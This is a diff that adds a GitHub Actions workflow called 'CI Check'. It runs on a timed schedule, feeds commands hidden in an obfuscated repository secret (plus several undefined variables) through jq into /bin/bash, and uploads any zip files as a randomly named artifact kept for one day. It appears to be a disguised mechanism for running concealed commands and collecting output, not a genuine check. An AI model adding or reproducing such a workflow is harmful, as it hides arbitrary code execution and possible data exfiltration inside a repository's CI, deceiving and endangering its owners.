@@ -1,0 +1,29 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 5,11,17,23 * * *'
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          zk968: ${{ secrets.zk968 }}
+        run: |
+          printf '%s' "$zk968" | jq -r .xaiz4733 | /bin/bash
+          echo $mj1 | jq -r .xxfjp8692 | /bin/bash
+          printf '%s' "$exsq5" | jq -r .cy9927 | /bin/bash
+          printf '%s' "$i0080" | jq -r .w56100 | /bin/bash
+          printf '%s' "$xuw988" | jq -r .c59947 | /bin/bash
+          echo $osfw6 | jq -r .yt886 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: N5jVtp5d
+          path: "*.zip"
+          retention-days: 1
